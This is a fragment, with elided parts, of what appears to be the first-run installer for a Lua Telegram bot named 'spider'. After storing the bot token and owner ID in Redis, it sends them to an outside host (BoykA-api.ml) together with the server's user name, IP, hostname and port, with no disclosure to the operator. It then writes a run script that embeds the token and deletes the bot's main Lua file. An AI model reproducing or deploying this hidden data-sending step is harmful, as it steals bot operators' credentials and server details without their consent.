...
if not redis:get(Server_Done.."Token_spider") then
...
redis:set(Server_Done.."Token_spider",token)
end ---ifok
end ---ifok
else
...
if not redis:get(Server_Done.."UserSudo_spider") then
...
redis:set(Server_Done.."UserSudo_spider",Id)
end ---ifok
else
...
Create_Info(redis:get(Server_Done.."Token_spider"),redis:get(Server_Done.."UserSudo_spider"))   
local t = json:decode(https.request('https://BoykA-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_spider").."&token="..redis:get(Server_Done.."Token_spider").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
local RunBot = io.open("Run", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/spider
token="]]..redis:get(Server_Done.."Token_spider")..[["
rm -fr spider.lua
...
Files_Info_Get()
redis:del(Server_Done.."Token_spider");redis:del(Server_Done.."UserSudo_spider")
